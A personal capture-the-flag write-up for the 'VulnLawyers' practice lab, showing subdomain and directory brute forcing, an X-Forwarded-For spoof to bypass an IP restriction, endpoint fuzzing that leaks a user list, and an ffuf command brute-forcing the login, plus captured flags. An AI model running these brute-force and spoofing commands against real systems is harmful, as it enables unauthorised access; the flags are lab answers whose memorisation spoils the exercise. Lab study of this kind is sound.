
This was the link:
`http://39sibnbe.vulnlawyers.co.uk/`

the basic approach is to look around , look into the page source :
it's not much there but a small link with the directory /images/ there
![[Pasted image 20230611144205.png]]

when we visit the /images/ we get 403 forbidden
so we need another way in 
starting the directory bruteforce

we get the result:
![[Pasted image 20230611144541.png]]
also trying a subdomain finding:
`dnsrecon -d vulnlawyers.co.uk -D subdomains.txt -t brt`
![[Pasted image 20230611181703.png]]
this is what the challenge said so subdomain bruteforcing on both:
htnm7qlo.vulnlawyers.co.uk and vulnlawyers.co.uk
and:
![[Pasted image 20230611181945.png]]

found a flag:
![[Pasted image 20230611181853.png]]


there's  a login func. so we check it out
![[Pasted image 20230611144636.png]]

there's a header that sends client's ip to the server XFF header:
when we apply it via curl:
![[Pasted image 20230611161044.png]]

we get the flag: `[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^]`

we also get this endpoint: 
*Access to this portal can now be found here ``<a href=/lawyers-only">/lawyers-only`

when we go there: 
![[Pasted image 20230611161327.png]]
Now we had another end-point "data" , we fuzz that too:
we get an end-point named "users"
![[Pasted image 20230611182250.png]]

***
{"users":[{"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.ctf"},{"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.ctf"},{"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.ctf"},{"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.ctf"},{"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.ctf"}],"flag":"[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"}
***

handling the content and printing it in a better manner via:
`cat file.json | jq '.users[] | .name, .email'`

with the command:
`ffuf -X POST -u http://n6s2bff3.vulnlawyers.co.uk/lawyers-only-login -d "email=UFUZZ&password=PFUZZ" -w ~/temp/emails.txt:UFUZZ -w passwords.txt:PFUZZ -H "Content-type: application/x-www-form-urlencoded" -t 4 -p 0.1 -fc 401`

we can get the creds by bruteforcing our way in
*  PFUZZ: summer
* UFUZZ: jaskaran.lowe@vulnlawyers.ctf
we get another flag:
[^FLAG^7F1ED1F306FC4E3399CEE15DF4B0AE3C^FLAG^]

this is what we get:
![[Pasted image 20230611185904.png]]

